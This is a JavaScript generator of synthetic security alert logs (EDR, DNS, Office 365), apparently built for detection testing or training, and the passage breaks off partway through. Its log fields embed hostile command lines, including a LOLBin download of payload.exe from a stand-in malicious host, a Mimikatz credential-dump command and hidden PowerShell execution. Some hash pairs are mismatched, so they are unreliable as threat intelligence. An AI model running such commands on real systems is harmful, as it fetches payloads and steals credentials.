
/**
 * Advanced Security Log Generator Based on Real-World Use Cases
 * Generates realistic security logs for multiple data sources using specific attack scenarios
 */

// Removed: import { getMalwareBazaarHash } from './threatIntelService'; // No longer using external service for hashes

// Helper function to get random element from array
function getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Use Cases Database - organized by data source
const USE_CASES_DATABASE = {
    EDR: [
        'Execution of PowerShell with Base64-Encoded Commands',
        'Suspicious Parent-Child Process Chain (e.g., Word → CMD → PowerShell)',
        'Process Injection Detected (e.g., into explorer.exe or svchost.exe)',
        'Execution from Suspicious File Path (e.g., %Temp%, %AppData%)',
        'Mimikatz Execution Detected on Endpoints',
        'New or Unknown Hash Executed on Multiple Endpoints',
        'Unsigned Executable Launched from Removable Media (USB)',
        'Encoded Command via WMI or WMIC Tool',
        'Persistence via Autorun Registry Key Modification',
        'Abnormal Number of File Modifications by a Single Process',
        'Execution of LOLBins (Living Off The Land Binaries)',
        'Remote Thread Injection Between Two Processes',
        'Endpoint Beaconing to Rare External IP (C2 Communication)',
        'Malicious Script Loaded from Memory Only (Fileless Malware)',
        'Access to LSASS Memory by Unauthorized Process',
        'Binary Masquerading – .exe with Icon and Name of Word/PDF',
        'Known Malicious Hash Executed (Based on Threat Intel)',
        'Executable Renamed to Evade Detection (e.g., mimikatz.exe → updater.exe)',
        'New Service Created and Set to Auto-Start by Suspicious Process',
        'Unexpected Parent Process for Sensitive Operations'
    ],

    DNS: [
        'DNS Query to Known Malicious Domain or C2 Server',
        'High Volume of NXDOMAIN Responses from Single Host',
        'DNS TXT Record Requests to Unusual Domains',
        'Rapid DNS Requests for Multiple Subdomains (FQDNs) of Same Domain',
        'Outbound DNS Queries Over Non-Standard Ports',
        'DNS Request for Newly Registered or Rare Domains',
        'DNS Cache Poisoning Attempt Detected via Anomalous Responses',
        'Internal Host Querying External DNS Server (Bypassing Corporate DNS)',
        'DNS Queries Containing Encoded Data in Subdomains',
        'Excessive DNS Requests Outside of Business Hours'
    ],

    Office365: [
        'Multiple Failed Login Attempts from Unusual Locations',
        'Email Received with Malicious Attachments (e.g., Macro-enabled docs)',
        'Unusual Email Forwarding Rules Set by User',
        'Email Sent to External Recipient Containing Sensitive Data',
        'Sign-in from Device or IP Not Seen Before',
        'Emails Marked as Spam Despite Being Internal',
        'Suspicious OAuth Token Usage for Third-Party App Access',
        'Multiple Quarantine Releases by User in Short Time',
        'Account Disabled After Suspicious Activity Detected',
        'Abnormal Mailbox Size Increase in Short Period'
    ],

    ActiveDirectory: [
        'Multiple Failed Kerberos Ticket Requests for Single Account',
        'New Domain Admin Account Created Outside Maintenance Window',
        'Unusual Group Membership Changes (e.g., adding users to privileged groups)',
        'Suspicious Logon Hours Detected for High-Privilege Accounts',
        'Use of Pass-the-Ticket or Pass-the-Hash Techniques Detected',
        'Unusual LDAP Queries with Sensitive Attribute Requests',
        'Abnormal Number of Account Lockouts',
        'DC Replication Requests from Unknown Hosts',
        'Service Account Used Outside Normal Scope or Schedule',
        'Suspicious Kerberos Golden Ticket Usage'
    ],

    DLP: [
        'Sensitive Files Uploaded to Unauthorized Cloud Storage',
        'Emails Sent Containing Credit Card or PII Data',
        'Copying of Sensitive Documents to USB Drives',
        'Printing of Sensitive Documents Outside Normal Hours',
        'Multiple Accesses to Sensitive Files by Non-Privileged Users',
        'Mass Download of Confidential Data from Internal File Shares',
        'Use of Personal Email Accounts to Send Corporate Data',
        'Encrypted Archive Files Created with Sensitive Data Inside',
        'Data Transferred Over Unapproved Protocols (e.g., FTP)',
        'Sensitive Data Accessed from Unmanaged Devices'
    ],

    Azure: [
        'Suspicious Login from Unfamiliar IP or Country (Conditional Access Triggered)',
        'Multiple Failed Sign-in Attempts Leading to Account Lockout',
        'Elevation of Privileges via Role Assignment Changes',
        'Creation of Service Principal with Excessive Permissions',
        'Suspicious API Calls from Unrecognized Applications',
        'New Virtual Machine Created with Public IP in Restricted Subnet',
        'Mass Deletion or Modification of Azure Storage Blobs',
        'Abnormal Data Transfer Volume in Azure Blob Storage',
        'Unusual Network Security Group (NSG) Rule Changes',
        'Login Using Legacy Authentication Protocols (e.g., Basic Auth)',
        'Azure AD Password Reset Requests from Suspicious Locations',
        'Disabled Multi-Factor Authentication (MFA) on Privileged Accounts',
        'Suspicious Use of Azure Functions to Execute Unknown Code',
        'Creation of Excessive Storage Account Access Keys',
        'Outbound Traffic to Known Malicious IPs from Azure Resources',
        'Service Account Used Outside Normal Working Hours',
        'Azure Sentinel Alert: Suspicious Activity on Virtual Machines',
        'Creation of Publicly Accessible SQL Database Instances',
        'Unauthorized Subscription or Resource Group Creation',
        'Excessive Failed Attempts to Access Key Vault Secrets'
    ],

    AWS: [
        'Suspicious Console Login from Unusual IP or Location',
        'Multiple Failed Login Attempts Leading to Account Lockout',
        'Creation of IAM User with Administrator Privileges',
        'Excessive Creation of Access Keys for IAM Users',
        'Unusual Use of Root Account for Daily Operations',
        'Modification or Deletion of CloudTrail Logs',
        'Creation or Modification of Security Group Rules Allowing Wide Access',
        'Lambda Function Execution from Suspicious Source IPs',
        'High Volume Data Transfer from S3 Buckets to External IPs',
        'Suspicious API Calls Indicating Possible Privilege Escalation',
        'Creation of Publicly Accessible S3 Buckets',
        'Deletion or Modification of IAM Policies Without Approval',
        'Use of Unapproved Regions for Resource Deployment',
        'Suspicious Activity Detected by GuardDuty (Threat Detection Service)',
        'Suspicious Changes to VPC Network ACLs or Route Tables',
        'IAM User Credentials Used Outside Normal Business Hours',
        'Use of Temporary Credentials for Long-Running Sessions',
        'Multiple Failed Attempts to Access AWS KMS Keys',
        'EC2 Instance Communicating with Known Malicious IPs',
        'Suspicious Cross-Account Access or Resource Sharing'
    ]
};

// Common data pools
const USERS = [
    { name: 'John Smith', username: 'jsmith', upn: 'john.smith@corp.com', domain: 'CORP' },
    { name: 'Sarah Johnson', username: 'sjohnson', upn: 'sarah.johnson@corp.com', domain: 'CORP' },
    { name: 'Michael Brown', username: 'mbrown', upn: 'michael.brown@corp.com', domain: 'CORP' },
    { name: 'Emily Davis', username: 'edavis', upn: 'emily.davis@corp.com', domain: 'CORP' },
    { name: 'David Wilson', username: 'dwilson', upn: 'david.wilson@corp.com', domain: 'CORP' },
    { name: 'Lisa Garcia', username: 'lgarcia', upn: 'lisa.garcia@corp.com', domain: 'CORP' }
];

const INTERNAL_IPS = ['192.168.1.100', '192.168.1.101', '10.0.0.50', '10.0.0.51'];
const EXTERNAL_IPS = ['203.0.113.10', '198.51.100.25', '185.199.108.153', '91.198.174.192'];
const MALICIOUS_IPS = ['198.51.100.10', '203.0.113.55', '46.161.62.140', '89.248.165.74'];
const IP_ADDRESSES = [...INTERNAL_IPS, ...EXTERNAL_IPS, ...MALICIOUS_IPS];

const HOSTNAMES = ['DC01', 'WS001', 'WS002', 'SRV-FILE01', 'LAPTOP-001', 'DESKTOP-HR01'];

const MALICIOUS_DOMAINS = ['evil-c2.com', 'malware-download.org', 'phishing-site.net', 'botnet-command.info'];

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
];

// Synchronous helper for malicious hashes
const knownMaliciousHashes = [
    { sha256: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", md5: "db349b97c37d22f5ea1d1841e3c89eb4", name: "WannaCry" },
    { sha256: "09a46b3e1be080745a6d8d88d6b5bd351b1c7586ae0dc94d0c238ee36421cafa", md5: "7bf2b57f2a205768755c07f238fb32cc", name: "WannaCry Dropper" },
    { sha256: "23873bf2670cf64c2440058130548d4e4da412378fb96c4e2a96ac4e211cb3ae", md5: "528c1e2b8e8b6cdab5a5c4b6e7d8e9f0", name: "Ryuk Ransomware" },
    { sha256: "275a021bbfb6489e54d471899f7db9d1663fc695ec2f2a2c4538aabf651fd0f9", md5: "d41d8cd98f00b204e9800998ecf8427e", name: "Emotet" },
    { sha256: "d5885c307044033c46e4d4128f6153df7c490a0740ac8d1416e917d840c83893", md5: "68b329da9893e34099c7d8ad5cb9c940", name: "TrickBot" }
];

function getRandomMaliciousHash() {
    return getRandomElement(knownMaliciousHashes);
}

/**
 * EDR Log Generator - Enhanced version with random malicious hashes
 */
function generateEDRLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const hostname = getRandomElement(HOSTNAMES);
    const processNames = ['powershell.exe', 'cmd.exe', 'winword.exe', 'excel.exe', 'explorer.exe', 'svchost.exe'];
    const suspiciousPaths = ['C:\\Users\\Public\\', 'C:\\Temp\\', 'C:\\Users\\' + user.username + '\\AppData\\'];

    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "CrowdStrike",
        product_name: "Falcon EDR",
        log_source: "EDR",
        event_type: "Detection",
        log_level: "High",
        device_name: hostname,
        user_name: user.username,
        // Base fields that will be enhanced by specific use case
        title: "",
        description: "",
        event_subtype: "",
        source_ip: getRandomElement(INTERNAL_IPS),
        firedtimes: 1
    };

    // Generate specific log based on use case
    switch (useCase) {
        case 'Execution of PowerShell with Base64-Encoded Commands':
            log = {
                ...log,
                title: "PowerShell Base64 Encoded Command Execution Detected",
                description: `PowerShell process executed with base64-encoded commands on ${hostname}. Command line contained suspicious encoded payload that may indicate obfuscated malware or attack script. User ${user.username} initiated the process.`,
                event_subtype: "SuspiciousPowerShell",
                process_name: "powershell.exe",
                command_line: `powershell.exe -EncodedCommand ${getRandomElement(['SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==', 'RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=='])}`,
                parent_process: "winword.exe",
                firedtimes: Math.floor(Math.random() * 3) + 1,
                log_level: "High"
            };
            break;

        case 'Suspicious Parent-Child Process Chain (e.g., Word → CMD → PowerShell)':
            log = {
                ...log,
                title: "Malicious Office Document Process Chain Detected",
                description: `Suspicious process chain detected: Microsoft Word spawned cmd.exe, which subsequently launched PowerShell. This behavior is consistent with macro-based malware delivery. Document opened by ${user.username} may contain malicious macros.`,
                event_subtype: "MaliciousProcessChain",
                process_name: "powershell.exe",
                parent_process: "cmd.exe",
                grandparent_process: "winword.exe",
                document_name: getRandomElement(['Invoice_2024.docm', 'Urgent_Payment.docx', 'Contract_Details.xlsm']),
                command_line: "cmd.exe /c powershell.exe -windowstyle hidden -file C:\\Users\\Public\\script.ps1",
                firedtimes: Math.floor(Math.random() * 5) + 2,
                log_level: "High"
            };
            break;

        case 'Process Injection Detected (e.g., into explorer.exe or svchost.exe)':
            const targetProcess = getRandomElement(['explorer.exe', 'svchost.exe', 'lsass.exe']);
            log = {
                ...log,
                title: "Process Injection Attack Detected",
                description: `Malicious code injection detected into legitimate system process ${targetProcess}. This technique is commonly used by malware to hide malicious activities and evade detection.`,
                event_subtype: "ProcessInjection",
                target_process: targetProcess,
                injection_technique: getRandomElement(['DLL Injection', 'Process Hollowing', 'Thread Injection']),
                firedtimes: 1,
                log_level: "Critical"
            };
            break;

        case 'Mimikatz Execution Detected on Endpoints':
            const mimikatzHash = getRandomMaliciousHash(); // Use synchronous hash assignment
            log = {
                ...log,
                title: "Credential Dumping Tool (Mimikatz) Execution",
                description: `A process matching signatures for the Mimikatz credential dumping tool was detected on ${hostname}. File hash ${mimikatzHash.sha256.substring(0, 16)}... matches ${mimikatzHash.name} signature. Immediate investigation required for potential credential compromise.`,
                event_subtype: "CredentialDumping",
                process_name: getRandomElement(['mimikatz.exe', 'mz.exe', 'updater.exe']),
                command_line: "mimikatz.exe \"sekurlsa::logonpasswords\" \"exit\"",
                file_hash: mimikatzHash.sha256,
                md5_hash: mimikatzHash.md5,
                threat_name: mimikatzHash.name,
                log_level: "Critical",
                firedtimes: 1
            };
            break;

        case 'Execution from Suspicious File Path (e.g., %Temp%, %AppData%)':
            const suspiciousHash = getRandomMaliciousHash(); // Use synchronous hash assignment
            log = {
                ...log,
                title: "Executable Launched from Suspicious Directory",
                description: `Executable file with hash ${suspiciousHash.sha256.substring(0, 16)}... launched from temporary directory ${getRandomElement(['%TEMP%', '%APPDATA%', '%LOCALAPPDATA%'])}. File matches known ${suspiciousHash.name} malware signature. This location is commonly used by malware to store and execute malicious payloads.`,
                event_subtype: "SuspiciousPathExecution",
                file_path: getRandomElement(['C:\\Users\\Public\\temp.exe', 'C:\\Windows\\Temp\\update.exe', '%APPDATA%\\system.exe']),
                file_hash: suspiciousHash.sha256,
                md5_hash: suspiciousHash.md5,
                threat_name: suspiciousHash.name,
                firedtimes: Math.floor(Math.random() * 4) + 1,
                log_level: "High"
            };
            break;

        // --- Retained and enhanced original EDR use cases not explicitly covered by outline's detailed cases ---
        case 'New or Unknown Hash Executed on Multiple Endpoints':
            const maliciousHashUnknown = getRandomMaliciousHash(); // Use synchronous hash assignment
            const endpointCount = Math.floor(Math.random() * 10) + 3;
            log = {
                ...log,
                title: "Unknown Binary Executed Across Multiple Endpoints",
                description: `Previously unseen executable with hash ${maliciousHashUnknown.sha256} detected on ${endpointCount} endpoints. Binary appears to be spreading through the network.`,
                event_subtype: "UnknownBinaryExecution",
                file_hash: maliciousHashUnknown.sha256,
                md5_hash: maliciousHashUnknown.md5,
                threat_name: maliciousHashUnknown.name,
                file_path: "C:\\Users\\Public\\newfile.exe",
                endpoint_count: endpointCount,
                firedtimes: endpointCount,
                log_level: "Critical"
            };
            break;

        case 'Execution of LOLBins (Living Off The Land Binaries)':
            const lolbins = ['certutil.exe', 'bitsadmin.exe', 'mshta.exe', 'wscript.exe', 'regsvr32.exe'];
            const selectedLolbin = getRandomElement(lolbins);
            log = {
                ...log,
                title: "Living Off The Land Binary Abuse Detected",
                description: `Legitimate Windows binary ${selectedLolbin} used for malicious purposes. This tool is being leveraged to download or execute suspicious content while evading detection.`,
                event_subtype: "LOLBinAbuse",
                process_name: selectedLolbin,
                command_line: `${selectedLolbin} -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe`,
                firedtimes: Math.floor(Math.random() * 3) + 1,
                log_level: "High"
            };
            break;
        case 'Unsigned Executable Launched from Removable Media (USB)':
            const usbHash = getRandomMaliciousHash(); // Use synchronous hash assignment
            log = {
                ...log,
                title: "Unsigned Executable from USB Drive",
                description: `An unsigned executable was launched from a removable media (USB) on ${hostname} by ${user.username}. This often bypasses standard security controls.`,
                event_subtype: "USBDriveExecution",
                file_path: "E:\\malicious.exe",
                file_hash: usbHash.sha256,
                md5_hash: usbHash.md5,
                signed: false,
                source: "Removable Media",
                log_level: "High"
            };
            break;
        case 'Encoded Command via WMI or WMIC Tool':
            log = {
                ...log,
                title: "Encoded Command Execution via WMI/WMIC",
                description: `WMIC or WMI tool used to execute an encoded command on ${hostname}. This technique is used for stealthy command execution and persistence.`,
                event_subtype: "WMIAttack",
                process_name: "wmic.exe",
                command_line: `wmic process call create "cmd /c echo encoded_command | powershell.exe -EncodedCommand"`,
                log_level: "High"
            };
            break;
        case 'Persistence via Autorun Registry Key Modification':
            log = {
                ...log,
                title: "Autorun Registry Key Modified for Persistence",
                description: `Suspicious modification of a critical Autorun registry key detected on ${hostname}. This is a common persistence mechanism used by malware.`,
                event_subtype: "PersistenceMechanism",
                registry_key: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                registry_value: "MaliciousApp",
                new_data: "C:\\ProgramData\\malicious.exe",
                log_level: "High"
            };
            break;
        case 'Abnormal Number of File Modifications by a Single Process':
            log = {
                ...log,
                title: "Abnormal File Modifications by Process",
                description: `A single process (${getRandomElement(processNames)}) on ${hostname} performed an abnormal number of file modifications, suggesting ransomware or data destruction activity.`,
                event_subtype: "MassFileModification",
                process_name: getRandomElement(processNames),
                file_mod_count: Math.floor(Math.random() * 500) + 100,
                log_level: "Critical"
            };
            break;
        case 'Remote Thread Injection Between Two Processes':
            log = {
                ...log,
                title: "Remote Thread Injection Detected",
                description: `Remote thread injection from ${getRandomElement(processNames)} into ${getRandomElement(processNames)} on ${hostname}. This technique bypasses traditional endpoint security.`,
                event_subtype: "RemoteThreadInjection",
                source_process: getRandomElement(processNames),
                target_process: getRandomElement(processNames),
                log_level: "High"
            };
            break;
        case 'Endpoint Beaconing to Rare External IP (C2 Communication)':
            const c2IP = getRandomElement(MALICIOUS_IPS);
            log = {
                ...log,
                title: "Endpoint Beaconing to Rare External IP (C2)",
                description: `Endpoint ${hostname} is beaconing to a rare external IP address (${c2IP}) which may indicate Command and Control (C2) communication.`,
                event_subtype: "C2Communication",
                destination_ip: c2IP,
                destination_port: getRandomElement([80, 443, 53, 8080]),
                protocol: "TCP",
                log_level: "Critical"
            };
            break;
        case 'Malicious Script Loaded from Memory Only (Fileless Malware)':
            log = {
                ...log,
                title: "Fileless Malware Detected in Memory",
                description: `A malicious script was detected executing directly from memory on ${hostname} without a corresponding file on disk, typical of fileless malware.`,
                event_subtype: "FilelessMalware",
                process_name: "powershell.exe",
                detection_method: "MemoryScan",
                log_level: "Critical"
            };
            break;
        case 'Access to LSASS Memory by Unauthorized Process':
            log = {
                ...log,
                title: "Unauthorized LSASS Memory Access",
                description: `An unauthorized process attempted to access the Local Security Authority Subsystem Service (LSASS) memory on ${hostname}, indicating a credential theft attempt.`,
                event_subtype: "LSASSAccess",
                process_name: getRandomElement(['cmd.exe', 'powershell.exe', 'custom_tool.exe']),
                target_process: "lsass.exe",
                log_level: "Critical"
            };
            break;
        case 'Binary Masquerading – .exe with Icon and Name of Word/PDF':
            const masqueradeExt = getRandomElement(['doc', 'pdf', 'jpg']);
            log = {
                ...log,
                title: "Binary Masquerading Detected",
                description: `An executable file (${getRandomElement(['report.exe', 'invoice.exe'])}) on ${hostname} is masquerading as a.${masqueradeExt} file, attempting to evade detection.`,
                event_subtype: "BinaryMasquerading",
                original_name: `report.${masqueradeExt}`,
                actual_name: `report.exe`,
                icon_mismatch: true,
                log_level: "High"
            };
            break;
        case 'Known Malicious Hash Executed (Based on Threat Intel)':
            const maliciousHash = getRandomMaliciousHash(); // Use synchronous hash assignment
            log = {
                ...log,
                title: "Known Malicious Binary Execution",
                description: `Executable with known malicious hash ${maliciousHash.sha256.substring(0, 16)}... was executed on ${hostname}. This binary is associated with ${maliciousHash.name} malware family and poses immediate security risk. File hash matches threat intelligence database.`,
                event_subtype: "MaliciousHashExecution",
                process_name: getRandomElement(['updater.exe', 'system32.exe', 'notepad.exe', 'svchost.exe']),
                file_hash: maliciousHash.sha256,
                md5_hash: maliciousHash.md5,
                threat_name: maliciousHash.name,
                log_level: "Critical",
                firedtimes: 1
            };
            break;
        case 'Executable Renamed to Evade Detection (e.g., mimikatz.exe → updater.exe)':
            log = {
                ...log,
                title: "Executable Renamed for Evasion",
                description: `A known malicious executable (e.g., mimikatz.exe) has been renamed to "${getRandomElement(['updater.exe', 'svchost.exe', 'chrome.exe'])}" to evade detection on ${hostname}.`,
                event_subtype: "NameSpoofing",
                original_name: "mimikatz.exe",
                renamed_to: getRandomElement(['updater.exe', 'svchost.exe', 'chrome.exe']),
                log_level: "High"
            };
            break;
        case 'New Service Created and Set to Auto-Start by Suspicious Process':
            log = {
                ...log,
                title: "New Auto-Starting Service Created by Suspicious Process",
                description: `A new service "${getRandomElement(['MaliciousService', 'UpdaterService'])}" was created and set to auto-start by a suspicious process on ${hostname}, indicating potential persistence.`,
                event_subtype: "ServiceCreation",
                service_name: getRandomElement(['MaliciousService', 'UpdaterService']),
                start_type: "Auto",
                created_by_process: getRandomElement(processNames),
                log_level: "High"
            };
            break;
        case 'Unexpected Parent Process for Sensitive Operations':
            log = {
                ...log,
                title: "Unexpected Parent Process for Sensitive Operation",
                description: `An unexpected parent process (${getRandomElement(['notepad.exe', 'calc.exe'])}) spawned a process for a sensitive operation (e.g., network connection) on ${hostname}.`,
                event_subtype: "UnexpectedParent",
                child_process: "cmd.exe",
                parent_process: getRandomElement(['notepad.exe', 'calc.exe']),
                sensitive_operation: "Network Connection",
                log_level: "High"
            };
            break;

        default:
            log.title = "EDR Security Detection";
            log.description = `Endpoint security event detected on ${hostname}. Use case: ${useCase}`;
            log.event_subtype = "GeneralEDREvent";
            break;
    }

    return log;
}

/**
 * DNS Log Generator - Merged logic from outline and original code
 */
function generateDNSLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const hostname = getRandomElement(HOSTNAMES);
    const legitimateDomains = ['google.com', 'microsoft.com', 'office.com', 'sharepoint.com'];

    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Cisco",
        product_name: "Umbrella",
        log_source: "DNS",
        event_type: "Detection",
        log_level: "Medium",
        device_name: hostname,
        user_name: user.username,
        source_ip: getRandomElement(INTERNAL_IPS),
        dns_server: "8.8.8.8",
        firedtimes: 1,
        // Initialize these as empty strings as per outline, will be set in switch
        title: "",
        description: "",
        event_subtype: ""
    };

    switch (useCase) {
        case 'DNS Query to Known Malicious Domain or C2 Server':
            const queryNameMal = getRandomElement(MALICIOUS_DOMAINS);
            log.title = "DNS Query to Known Malicious Command & Control Server";
            log.description = `Host ${hostname} attempted to resolve known malicious domain "${queryNameMal}" which is identified as a command and control server. This indicates potential malware infection or compromise. Domain is associated with ${getRandomElement(['Cobalt Strike', 'Emotet', 'TrickBot'])} malware family.`;
            log.event_subtype = "MaliciousDomainQuery";
            log.query_name = queryNameMal;
            log.query_type = "A";
            log.response_code = "NOERROR";
            log.resolved_ip = getRandomElement(MALICIOUS_IPS);
            log.ThreatCategory = getRandomElement(['Malware', 'Command & Control', 'Botnet']);
            log.log_level = "High";
            log.firedtimes = Math.floor(Math.random() * 8) + 3;
            break;

        case 'High Volume of NXDOMAIN Responses from Single Host':
            const queryCount = Math.floor(Math.random() * 500) + 100;
            log.title = "Excessive DNS Resolution Failures from Single Host";
            log.description = `Host ${hostname} generated ${queryCount} NXDOMAIN (non-existent domain) responses in the last hour. This pattern may indicate DNS tunneling, malware beacon failures, or domain generation algorithm (DGA) activity.`;
            log.event_subtype = "ExcessiveNXDOMAIN";
            log.query_name = `random${Math.random().toString(36).substring(7)}.nonexistentdomain.com`;
            log.query_type = "A";
            log.response_code = "NXDOMAIN";
            log.query_count = queryCount;
            log.firedtimes = queryCount;
            log.log_level = "High";
            break;

        case 'DNS TXT Record Requests to Unusual Domains':
            const txtQueryName = getRandomElement(['random-string-123.com', 'data-exfil.net', 'covert-channel.org']);
            log.title = "Suspicious DNS TXT Record Queries";
            log.description = `Host ${hostname} made multiple TXT record requests to domain "${txtQueryName}". TXT records are commonly abused for data exfiltration and covert communication channels. Requests may contain encoded data.`;
            log.event_subtype = "SuspiciousTXTQuery";
            log.query_name = txtQueryName;
            log.query_type = "TXT";
            log.response_data = "encoded_exfiltrated_data_here";
            log.firedtimes = Math.floor(Math.random() * 5) + 1;
            log.log_level = "High";
            break;

        // --- Retained and enhanced original DNS use cases not explicitly covered by outline's detailed cases ---
        case 'Rapid DNS Requests for Multiple Subdomains (FQDNs) of Same Domain':
            const baseDomain = getRandomElement(MALICIOUS_DOMAINS);
            const subdomainCount = Math.floor(Math.random() * 20) + 10;
            log = {
                ...log,
                title: "Domain Generation Algorithm Activity Detected",
                description: `Rapid DNS requests for ${subdomainCount} subdomains of ${baseDomain}. This pattern is consistent with domain generation algorithms used by malware.`,
                event_subtype: "DGADetection",
                query_name: `${Math.random().toString(36).substring(7)}.${baseDomain}`,
                query_type: "A",
                algorithm_pattern: "DGA_Detected",
                subdomain_count: subdomainCount,
                firedtimes: subdomainCount,
                log_level: "High"
            };
            break;
        case 'Outbound DNS Queries Over Non-Standard Ports':
            log = {
                ...log,
                title: "Outbound DNS Over Non-Standard Port",
                description: `Host ${hostname} initiated DNS queries over a non-standard port (${getRandomElement([5353, 853, 53000])}) to ${getRandomElement(EXTERNAL_IPS)}. This could indicate tunneling or evasion.`,
                event_subtype: "NonStandardDNSPort",
                destination_port: getRandomElement([5353, 853, 53000]),
                protocol: "UDP",
                destination_ip: getRandomElement(EXTERNAL_IPS),
                log_level: "High"
            };
            break;
        case 'DNS Request for Newly Registered or Rare Domains':
            const rareDomain = `newlyregistered-${Math.random().toString(36).substring(2, 8)}.com`;
            log = {
                ...log,
                title: "DNS Query to Newly Registered/Rare Domain",
                description: `Host ${hostname} queried a newly registered or rare domain: ${rareDomain}. Such domains are often used in initial stages of attacks.`,
                event_subtype: "RareDomainQuery",
                query_name: rareDomain,
                registration_age_days: Math.floor(Math.random() * 30) + 1,
                log_level: "Medium"
            };
            break;
        case 'DNS Cache Poisoning Attempt Detected via Anomalous Responses':
            log = {
                ...log,
                title: "DNS Cache Poisoning Attempt",
                description: `Anomalous DNS responses from DNS server ${log.dns_server} detected, indicating a potential DNS cache poisoning attempt targeting ${hostname}.`,
                event_subtype: "DNSCachePoisoning",
                resolved_ip: "1.2.3.4",
                expected_ip: "5.6.7.8",
                log_level: "Critical"
            };
            break;
        case 'Internal Host Querying External DNS Server (Bypassing Corporate DNS)':
            log = {
                ...log,
                title: "Internal Host Bypassing Corporate DNS",
                description: `Internal host ${hostname} directly queried an external DNS server (${getRandomElement(['8.8.8.8', '1.1.1.1'])}), bypassing corporate DNS policies.`,
                event_subtype: "DNSBypass",
                dns_server: getRandomElement(['8.8.8.8', '1.1.1.1']),
                log_level: "Medium"
            };
            break;
        case 'DNS Queries Containing Encoded Data in Subdomains':
            log = {
                ...log,
                title: "DNS Query with Encoded Data (Exfiltration)",
                description: `DNS query from ${hostname} contains highly anomalous subdomains like 'exfil-data-base64string.malicious.com', suggesting data exfiltration via DNS.`,
                event_subtype: "DNSEncodedData",
                query_name: `exfil-${btoa('sensitive_data_here').substring(0, 20).toLowerCase()}.exfil-domain.com`,
                log_level: "Critical"
            };
            break;
        case 'Excessive DNS Requests Outside of Business Hours':
            log = {
                ...log,
                title: "Excessive DNS Requests Outside Business Hours",
                description: `Host ${hostname} made an excessive number of DNS requests outside normal business hours (${timestamp.getHours()}h). This could indicate automated activity or compromise.`,
                event_subtype: "OffHoursDNS",
                query_count: Math.floor(Math.random() * 200) + 50,
                log_level: "Medium"
            };
            break;

        default:
            log.title = "DNS Security Alert";
            log.description = `DNS security event detected from host ${hostname}. Suspicious DNS activity requires investigation.`;
            log.event_subtype = "GeneralDNSEvent";
            break;
    }

    return log;
}

/**
 * Office 365 Log Generator
 */
function generateOffice365Log(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const hostname = getRandomElement(HOSTNAMES);
    
    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Microsoft",
        product_name: "Office 365",
        log_source: "Office365",
        event_type: "Detection",
        log_level: "Medium",
        device_name: hostname,
        user_name: user.username, // Original code uses user.username, outline has user.email (not in USERS obj). Sticking to existing.
        UserId: user.upn, // Original code uses user.upn
        ClientIP: getRandomElement(IP_ADDRESSES),
        UserAgent: getRandomElement(USER_AGENTS),
        firedtimes: 1,
        title: "",
        description: "",
        event_subtype: ""
    };

    switch (useCase) {
        case 'Multiple Failed Login Attempts from Unusual Locations':
            const attemptCount = Math.floor(Math.random() * 15) + 8;
            const suspiciousIP = getRandomElement(MALICIOUS_IPS);
            const country = getRandomElement(['Russia', 'China', 'Nigeria', 'Romania']);
            const city = getRandomElement(['Moscow', 'Beijing', 'Lagos', 'Bucharest']);
            log = {
                ...log,
                title: "Multiple Failed Sign-in Attempts from New Location",
                description: `User ${user.upn} had ${attemptCount} failed sign-in attempts from IP ${suspiciousIP} in ${country} (${city}). This location has never been used by this user before. Possible brute force or credential stuffing attack.`,
                event_subtype: "SuspiciousSignIn",
                ClientIP: suspiciousIP,
                LoginStatus: "Failed",
                FailureReason: "InvalidCredentials",
                AttemptCount: attemptCount,
                Country: country,
                City: city,
                Operation: "UserLoginFailed",
                ResultStatus: "Failed",
                firedtimes: attemptCount,
                log_level: "High"
            };
            break;

        case 'Email Received with Malicious Attachments (e.g., Macro-enabled docs)':
            // Changed from await getMalwareBazaarHash() to hardcoded hash as per outline
            log = {
                ...log,
                title: "Malicious Email Attachment Detected",
                description: `Email received by ${user.upn} contains potentially malicious attachment "${getRandomElement(['Invoice_2024.docm', 'Payment_Details.xlsm', 'Urgent_Document.pptm'])}". Attachment contains macros and passed initial security scan but requires investigation. Sender: ${getRandomElement(['finance@suspicious-domain.com', 'hr@fake-company.org'])}.`,
                event_subtype: "MaliciousAttachment",
                Workload: "Exchange",
                MessageSubject: getRandomElement(['Urgent Payment Required', 'Invoice Attached', 'Contract Review Needed']),
                Sender: getRandomElement(['finance@suspicious-partner.com', 'phishing.ceo@external.com']),
                AttachmentName: getRandomElement(['Invoice_2024.xlsm', 'Contract.docm', 'Report.pptm']),
                file_hash: "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", // Hardcoded as per outline
                // Removed md5_hash and threat_name as they are not in the outline for this specific case
                ScanResult: "Suspicious",
